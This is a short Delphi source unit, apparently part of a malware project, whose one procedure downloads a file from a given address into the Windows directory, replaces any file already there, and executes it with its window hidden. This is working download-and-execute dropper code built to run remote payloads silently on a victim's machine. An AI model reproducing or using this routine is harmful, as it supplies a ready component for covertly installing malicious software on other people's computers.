unit uDownloader;

interface

uses
  Windows, URLMon, ShellApi, uUtils;

procedure DownloadExecute(Addr, Name :String);

implementation

procedure DownloadExecute(Addr, Name :String);
var
  Path :String;
begin
  Path := WinDir(Name);
  if FileExists(Path) then DeleteFile(PChar(Path));
  URLDownloadToFile(nil, PChar(Addr), PChar(Path), 0, nil);
  ShellExecute(0, 'open', PChar(Path), nil, nil, SW_HIDE);
end;

end.
